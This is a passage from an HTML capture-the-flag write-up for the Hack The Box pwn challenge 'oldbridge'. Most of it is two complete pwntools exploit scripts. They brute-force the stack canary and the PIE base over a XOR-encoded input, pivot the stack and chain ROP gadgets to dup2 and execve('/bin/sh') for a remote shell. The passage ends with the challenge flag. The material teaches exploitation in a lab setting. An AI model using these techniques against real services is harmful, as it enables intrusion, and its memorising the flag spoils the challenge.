<p>Attacker controlled rbp gets written into rsp</p>
</li>
<li>
<p>rsp gets incremented, value at attacker controlled address gets written into rbp</p>
</li>
</ul>
<p>And with that, rsp has been overwritten, stack has been pivoted. We don't have to concern ourselves with the second value written to rbp, we won't be using it anymore.</p>
<p>As to where to pivot, we can simply pivot back to the beginning of our user input, and plant our payload there.</p>
<h2>execve("/bin/sh")</h2>
<p>As we have plenty of space, i have opted to use an execve("/bin/sh") call in favor of a ret2libc. The following code will attempt such an exploit:</p>
<div class="codehilite"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">elf</span> <span class="o">=</span> <span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&quot;./oldbridge&quot;</span><span class="p">)</span>

<span class="n">HOST</span> <span class="o">=</span> <span class="s2">&quot;127.0.0.1&quot;</span>
<span class="n">PORT</span> <span class="o">=</span> <span class="mi">1234</span>

<span class="k">def</span> <span class="nf">xor_payload</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="n">n</span><span class="p">):</span>  <span class="c1"># Xors entire payload by some number</span>
    <span class="k">return</span> <span class="nb">bytes</span><span class="p">(</span><span class="nb">bytearray</span><span class="p">((</span><span class="n">char</span> <span class="o">^</span> <span class="n">n</span> <span class="k">for</span> <span class="n">char</span> <span class="ow">in</span> <span class="n">payload</span><span class="p">)))</span>

<span class="k">def</span> <span class="nf">leak_value</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">known</span><span class="o">=</span><span class="sa">b</span><span class="s2">&quot;&quot;</span><span class="p">,</span> <span class="n">prepad</span><span class="o">=</span><span class="sa">b</span><span class="s2">&quot;&quot;</span><span class="p">):</span>
    <span class="n">leak</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">(</span><span class="n">known</span><span class="p">)</span>

    <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">8</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">leak</span><span class="p">)):</span>
        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">256</span><span class="p">):</span>
            <span class="n">conn</span> <span class="o">=</span> <span class="n">connect</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">10</span><span class="p">)</span>
            <span class="n">conn</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;name:&quot;</span><span class="p">)</span>

            <span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;il{dih&quot;</span>  <span class="c1"># Initial base to check if the guess is correct</span>
            <span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;A&quot;</span> <span class="o">*</span> <span class="p">(</span><span class="mi">1032</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span>  <span class="c1"># Padding to reach desired value</span>
            <span class="n">payload</span> <span class="o">+=</span> <span class="n">prepad</span>  <span class="c1"># Add prepad such as canary</span>
            <span class="n">payload</span> <span class="o">+=</span> <span class="n">leak</span>  <span class="c1"># Add known leaked part</span>
            <span class="n">payload</span> <span class="o">+=</span> <span class="n">i</span><span class="o">.</span><span class="n">to_bytes</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s2">&quot;big&quot;</span><span class="p">)[:</span><span class="mi">1</span><span class="p">]</span>  <span class="c1"># Add guess</span>
            <span class="n">payload</span> <span class="o">=</span> <span class="n">xor_payload</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="mi">13</span><span class="p">)</span>  <span class="c1"># XOR entire payload</span>

            <span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>

            <span class="k">try</span><span class="p">:</span>
                <span class="n">res</span> <span class="o">=</span> <span class="n">conn</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>

                <span class="k">if</span> <span class="sa">b</span><span class="s2">&quot;found!&quot;</span> <span class="ow">in</span> <span class="n">res</span><span class="p">:</span>
                    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;New byte: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
                    <span class="n">leak</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
                    <span class="k">break</span>
            <span class="k">except</span><span class="p">:</span>
                <span class="k">pass</span>

            <span class="n">conn</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Error!&quot;</span><span class="p">)</span>
            <span class="n">exit</span><span class="p">()</span>

    <span class="k">return</span> <span class="n">u64</span><span class="p">(</span><span class="n">leak</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">execute_rop</span><span class="p">(</span><span class="n">payload</span><span class="p">):</span>
    <span class="n">pivot_lock</span> <span class="o">=</span> <span class="n">stack_rbp</span> <span class="o">-</span> <span class="mh">0x480</span>  <span class="c1"># Location to pivot to, pointing at the beginning of user input</span>

    <span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;A&quot;</span> <span class="o">*</span> <span class="p">(</span><span class="mi">1032</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">canary</span><span class="p">)</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pivot_lock</span><span class="p">)</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">rop</span><span class="o">.</span><span class="n">leave</span><span class="o">.</span><span class="n">address</span><span class="p">)</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="n">xor_payload</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="mi">13</span><span class="p">)</span>

    <span class="n">conn</span> <span class="o">=</span> <span class="n">connect</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">10</span><span class="p">)</span>
    <span class="n">conn</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;name:&quot;</span><span class="p">)</span>

    <span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">conn</span>

<span class="n">canary</span> <span class="o">=</span> <span class="n">leak_value</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="p">))</span>
<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Leaked stack canary </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">canary</span><span class="p">)</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>

<span class="n">stack_rbp</span> <span class="o">=</span> <span class="n">leak_value</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">prepad</span><span class="o">=</span><span class="n">p64</span><span class="p">(</span><span class="n">canary</span><span class="p">))</span>
<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Leaked stack rbp </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">stack_rbp</span><span class="p">)</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>

<span class="n">rip</span> <span class="o">=</span> <span class="n">leak_value</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="p">(</span><span class="mh">0xcf</span><span class="p">,</span> <span class="mh">0x0e</span><span class="p">),</span> <span class="n">p64</span><span class="p">(</span><span class="n">canary</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">stack_rbp</span><span class="p">))</span>
<span class="n">elf</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">rip</span> <span class="o">-</span> <span class="mh">0x0ecf</span>
<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Leaked PIE base </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">address</span><span class="p">)</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>

<span class="n">rop</span> <span class="o">=</span> <span class="n">ROP</span><span class="p">(</span><span class="n">elf</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;/bin/sh</span><span class="se">\x00</span><span class="s2">&quot;</span>  <span class="c1"># Value to point execve to</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">rop</span><span class="o">.</span><span class="n">rsi</span><span class="o">.</span><span class="n">address</span><span class="p">)</span>  <span class="c1"># pop rsi; pop 15; ret</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">*</span> <span class="mi">2</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">rop</span><span class="o">.</span><span class="n">rax</span><span class="o">.</span><span class="n">address</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">59</span><span class="p">)</span>  <span class="c1"># Syscall for execve</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">rop</span><span class="o">.</span><span class="n">rdi</span><span class="o">.</span><span class="n">address</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">stack_rbp</span> <span class="o">-</span> <span class="mh">0x480</span><span class="p">)</span>  <span class="c1"># Will point back to /bin/sh</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">rop</span><span class="o">.</span><span class="n">rdx</span><span class="o">.</span><span class="n">address</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">rop</span><span class="o">.</span><span class="n">syscall</span><span class="o">.</span><span class="n">address</span><span class="p">)</span>

<span class="n">conn</span> <span class="o">=</span> <span class="n">execute_rop</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<span class="n">conn</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div>

<p>Running this code locally, and we get a shell! But not where we would expect it. The shell actually popped on the host, not on the client.</p>
<p>What's going here? Well, HTB pwn challenges are usually built to automatically redirect stdin and stdout to the client connection, meaning we can control the shell. But that is not a given, and as we can see here, when stdin and stdout is not redirected, the shell will pop on the server.</p>
<p>I thought this would take long to fix, as i had never encountered this before, but after a bit of googling, you would arrive at the dup2 syscall. dup2 takes a file descriptor, and replaces it with another. If we were to debug the program in gdb, and check the file descriptor that the program uses to communicate with the user, we would find that the default value is 4. Assuming this is the same on the server, we can create a final solution, that will redirect stdin and stdout to the client, popping a shell remotely.</p>
<hr />
<h1>Final solution</h1>
<p>With this small modification, our final code looks like this:</p>
<div class="codehilite"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">elf</span> <span class="o">=</span> <span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&quot;./oldbridge&quot;</span><span class="p">)</span>

<span class="n">HOST</span> <span class="o">=</span> <span class="s2">&quot;127.0.0.1&quot;</span>
<span class="n">PORT</span> <span class="o">=</span> <span class="mi">1234</span>

<span class="k">def</span> <span class="nf">xor_payload</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="n">n</span><span class="p">):</span>  <span class="c1"># Xors entire payload by some number</span>
    <span class="k">return</span> <span class="nb">bytes</span><span class="p">(</span><span class="nb">bytearray</span><span class="p">((</span><span class="n">char</span> <span class="o">^</span> <span class="n">n</span> <span class="k">for</span> <span class="n">char</span> <span class="ow">in</span> <span class="n">payload</span><span class="p">)))</span>

<span class="k">def</span> <span class="nf">leak_value</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">known</span><span class="o">=</span><span class="sa">b</span><span class="s2">&quot;&quot;</span><span class="p">,</span> <span class="n">prepad</span><span class="o">=</span><span class="sa">b</span><span class="s2">&quot;&quot;</span><span class="p">):</span>
    <span class="n">leak</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">(</span><span class="n">known</span><span class="p">)</span>

    <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">8</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">leak</span><span class="p">)):</span>
        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">256</span><span class="p">):</span>
            <span class="n">conn</span> <span class="o">=</span> <span class="n">connect</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">10</span><span class="p">)</span>
            <span class="n">conn</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;name:&quot;</span><span class="p">)</span>

            <span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;il{dih&quot;</span>  <span class="c1"># Initial base to check if the guess is correct</span>
            <span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;A&quot;</span> <span class="o">*</span> <span class="p">(</span><span class="mi">1032</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span>  <span class="c1"># Padding to reach desired value</span>
            <span class="n">payload</span> <span class="o">+=</span> <span class="n">prepad</span>  <span class="c1"># Add prepad such as canary</span>
            <span class="n">payload</span> <span class="o">+=</span> <span class="n">leak</span>  <span class="c1"># Add known leaked part</span>
            <span class="n">payload</span> <span class="o">+=</span> <span class="n">i</span><span class="o">.</span><span class="n">to_bytes</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s2">&quot;big&quot;</span><span class="p">)[:</span><span class="mi">1</span><span class="p">]</span>  <span class="c1"># Add guess</span>
            <span class="n">payload</span> <span class="o">=</span> <span class="n">xor_payload</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="mi">13</span><span class="p">)</span>  <span class="c1"># XOR entire payload</span>

            <span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>

            <span class="k">try</span><span class="p">:</span>
                <span class="n">res</span> <span class="o">=</span> <span class="n">conn</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>

                <span class="k">if</span> <span class="sa">b</span><span class="s2">&quot;found!&quot;</span> <span class="ow">in</span> <span class="n">res</span><span class="p">:</span>
                    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;New byte: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
                    <span class="n">leak</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
                    <span class="k">break</span>
            <span class="k">except</span><span class="p">:</span>
                <span class="k">pass</span>

            <span class="n">conn</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Error!&quot;</span><span class="p">)</span>
            <span class="n">exit</span><span class="p">()</span>

    <span class="k">return</span> <span class="n">u64</span><span class="p">(</span><span class="n">leak</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">execute_rop</span><span class="p">(</span><span class="n">payload</span><span class="p">):</span>
    <span class="n">pivot_lock</span> <span class="o">=</span> <span class="n">stack_rbp</span> <span class="o">-</span> <span class="mh">0x480</span>  <span class="c1"># Location to pivot to, pointing at the beginning of user input</span>

    <span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;A&quot;</span> <span class="o">*</span> <span class="p">(</span><span class="mi">1032</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">canary</span><span class="p">)</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pivot_lock</span><span class="p">)</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">rop</span><span class="o">.</span><span class="n">leave</span><span class="o">.</span><span class="n">address</span><span class="p">)</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="n">xor_payload</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="mi">13</span><span class="p">)</span>

    <span class="n">conn</span> <span class="o">=</span> <span class="n">connect</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">10</span><span class="p">)</span>
    <span class="n">conn</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;name:&quot;</span><span class="p">)</span>

    <span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">conn</span>

<span class="n">canary</span> <span class="o">=</span> <span class="n">leak_value</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="p">))</span>
<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Leaked stack canary </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">canary</span><span class="p">)</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>

<span class="n">stack_rbp</span> <span class="o">=</span> <span class="n">leak_value</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">prepad</span><span class="o">=</span><span class="n">p64</span><span class="p">(</span><span class="n">canary</span><span class="p">))</span>
<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Leaked stack rbp </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">stack_rbp</span><span class="p">)</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>

<span class="n">rip</span> <span class="o">=</span> <span class="n">leak_value</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="p">(</span><span class="mh">0xcf</span><span class="p">,</span> <span class="mh">0x0e</span><span class="p">),</span> <span class="n">p64</span><span class="p">(</span><span class="n">canary</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">stack_rbp</span><span class="p">))</span>
<span class="n">elf</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">rip</span> <span class="o">-</span> <span class="mh">0x0ecf</span>
<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Leaked PIE base </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">address</span><span class="p">)</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>

<span class="n">rop</span> <span class="o">=</span> <span class="n">ROP</span><span class="p">(</span><span class="n">elf</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;/bin/sh</span><span class="se">\x00</span><span class="s2">&quot;</span>  <span class="c1"># Value to point execve to</span>

<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">rop</span><span class="o">.</span><span class="n">rdi</span><span class="o">.</span><span class="n">address</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>  <span class="c1"># Client connection</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">rop</span><span class="o">.</span><span class="n">rsi</span><span class="o">.</span><span class="n">address</span><span class="p">)</span>  <span class="c1"># pop rsi; pop r15; ret;</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="o">*</span> <span class="mi">2</span>  <span class="c1"># stdout</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">rop</span><span class="o">.</span><span class="n">rax</span><span class="o">.</span><span class="n">address</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">33</span><span class="p">)</span>  <span class="c1"># dup2 syscall</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">rop</span><span class="o">.</span><span class="n">syscall</span><span class="o">.</span><span class="n">address</span><span class="p">)</span>

<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">rop</span><span class="o">.</span><span class="n">rdi</span><span class="o">.</span><span class="n">address</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>  <span class="c1"># Client connection</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">rop</span><span class="o">.</span><span class="n">rsi</span><span class="o">.</span><span class="n">address</span><span class="p">)</span>  <span class="c1"># pop rsi; pop r15; ret;</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">*</span> <span class="mi">2</span>  <span class="c1"># stdin</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">rop</span><span class="o">.</span><span class="n">rax</span><span class="o">.</span><span class="n">address</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">33</span><span class="p">)</span>  <span class="c1"># dup2 syscall</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">rop</span><span class="o">.</span><span class="n">syscall</span><span class="o">.</span><span class="n">address</span><span class="p">)</span>

<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">rop</span><span class="o">.</span><span class="n">rsi</span><span class="o">.</span><span class="n">address</span><span class="p">)</span>  <span class="c1"># pop rsi; pop r15; ret;</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">*</span> <span class="mi">2</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">rop</span><span class="o">.</span><span class="n">rax</span><span class="o">.</span><span class="n">address</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">59</span><span class="p">)</span>  <span class="c1"># Syscall for execve</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">rop</span><span class="o">.</span><span class="n">rdi</span><span class="o">.</span><span class="n">address</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">stack_rbp</span> <span class="o">-</span> <span class="mh">0x480</span><span class="p">)</span>  <span class="c1"># Will point back to /bin/sh</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">rop</span><span class="o">.</span><span class="n">rdx</span><span class="o">.</span><span class="n">address</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">rop</span><span class="o">.</span><span class="n">syscall</span><span class="o">.</span><span class="n">address</span><span class="p">)</span>

<span class="n">conn</span> <span class="o">=</span> <span class="n">execute_rop</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<span class="n">conn</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div>

<p>Trying this locally, it will pop a shell. Trying it remotely, well, connection issues. The program is likely to fail before leaking all values. Importantly, we can simply add the known values to our script, and run it again, as the leaked values will be the same. Running the program - several times - we finally obtain a shell and the flag: <code>HTB{q4i1q3_i1i3_p0a_a01}</code>.</p>
            </div>
        
        
    </div>

    </body>
</html>